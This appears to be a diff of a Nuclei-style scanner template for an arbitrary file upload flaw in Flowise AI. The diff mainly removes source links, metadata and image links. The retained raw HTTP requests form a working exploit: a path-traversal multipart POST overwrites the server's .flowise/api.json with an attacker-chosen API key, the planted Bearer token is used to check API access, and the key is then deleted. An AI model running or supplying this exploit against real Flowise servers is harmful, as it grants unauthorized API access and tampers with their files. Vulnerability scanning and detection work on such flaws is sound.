@@ -3,15 +3,11 @@ info:
   name: Flowise AI 系统attachments任意文件上传漏洞 - 副本
   author: hacktwo
   severity: high
-  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/ogdtg233egg3brg5'
+  description: ''
   tags: file-upload,2025
-  metadata:
-    source: yuque-hacktwo-dtdx2v
-    doc-slug: ogdtg233egg3brg5
-    fofa: app="FlowiseAI"
 http:
 - raw:
-  - "POST /api/v1/attachments/..%2f..%2f..%2f..%2f..%2froot%2f/.flowise HTTP/1.1\nHost: {{Hostname}}\nContent-Type: multipart/form-data; boundary=----WebKitFormBoundarydTh0yj8zypRgPT1w\n------WebKitFormBoundarydTh0yj8zypRgPT1w\nContent-Disposition: form-data; name=\"files\"; filename=\"api.json\"\nContent-type: text/plain\n[{\n  \"keyName\":\"=\",\n  \"apiKey\":\"24NHxsKIZi7Ee34rl7FtW3dtW1IuYjFQDegXP_Bn8yQ\",\n  \"apiSecret\":\"8648f55db62716a6577b565efb66145b9ad8c50884c57ae8d4f03c4cd8b3ee27b1f77804d320f08bac8aa4b0dbf58a39dacbb767eb05efe1e57d5c66e5d48473.af4b3f229bd11ac5\",\n  \"createdAt\":\"111\",\n  \"id\":\"1111\"\n}]\n------WebKitFormBoundarydTh0yj8zypRgPT1w--\n\n![](https://cdn.nlark.com/yuque/0/2025/png/43110909/1742478145849-e8322501-7a5b-4540-884a-6412a8c95123.png)\n查找api是否存在"
+  - "POST /api/v1/attachments/..%2f..%2f..%2f..%2f..%2froot%2f/.flowise HTTP/1.1\nHost: {{Hostname}}\nContent-Type: multipart/form-data; boundary=----WebKitFormBoundarydTh0yj8zypRgPT1w\n------WebKitFormBoundarydTh0yj8zypRgPT1w\nContent-Disposition: form-data; name=\"files\"; filename=\"api.json\"\nContent-type: text/plain\n[{\n  \"keyName\":\"=\",\n  \"apiKey\":\"24NHxsKIZi7Ee34rl7FtW3dtW1IuYjFQDegXP_Bn8yQ\",\n  \"apiSecret\":\"8648f55db62716a6577b565efb66145b9ad8c50884c57ae8d4f03c4cd8b3ee27b1f77804d320f08bac8aa4b0dbf58a39dacbb767eb05efe1e57d5c66e5d48473.af4b3f229bd11ac5\",\n  \"createdAt\":\"111\",\n  \"id\":\"1111\"\n}]\n------WebKitFormBoundarydTh0yj8zypRgPT1w--\n\n查找api是否存在"
   redirects: false
   matchers:
   - status:
@@ -24,7 +20,6 @@ http:
 
     Authorization: Bearer 24NHxsKIZi7Ee34rl7FtW3dtW1IuYjFQDegXP_Bn8yQ
 
-    ![](https://cdn.nlark.com/yuque/0/2025/png/43110909/1742478146130-9b91c033-cc78-4e3f-a318-6afed48f14e4.png)
 
     删除写入文件，数据还原'
   redirects: false
@@ -35,7 +30,6 @@ http:
 - raw:
   - 'DELETE /api/v1/apikey/1111 HTTP/1.1
 
-    ![](https://cdn.nlark.com/yuque/0/2025/png/43110909/1742478146398-ba7f8b95-7d59-4668-9ead-55ea9b186a3e.png)
 
     Authorization: Bearer 24NHxsKIZi7Ee34rl7FtW3dtW1IuYjFQDegXP_Bn8yQ
 
